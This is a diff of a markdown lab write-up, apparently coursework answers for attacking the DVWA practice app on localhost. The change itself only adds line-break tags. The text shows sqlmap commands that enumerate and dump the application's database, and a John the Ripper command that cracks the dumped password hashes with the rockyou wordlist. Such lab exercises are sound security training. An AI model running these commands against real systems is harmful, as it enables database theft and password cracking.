@@ -145,23 +145,23 @@ Password: password <br>
 sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit" --dbs
 
 ```
-![](./imgs/task2_3.png)
-**Question 2**: Use sqlmap to get tables, users information
-**Answer 2**:
-get tables
+![](./imgs/task2_3.png) <br>
+**Question 2**: Use sqlmap to get tables, users information <br>
+**Answer 2**: <br>
+get tables <br>
 ```
 sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" -D dvwa --tables
 ```
 ![](./imgs/task2_4.png)
-get users
+get users <br>
 ```
 sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" -D dvwa --dump
 
 ```
 ![](./imgs/task2_5.png)
 
-**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
-**Answer 3**:
+**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit <br>
+**Answer 3**: <br>
 ```
 john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
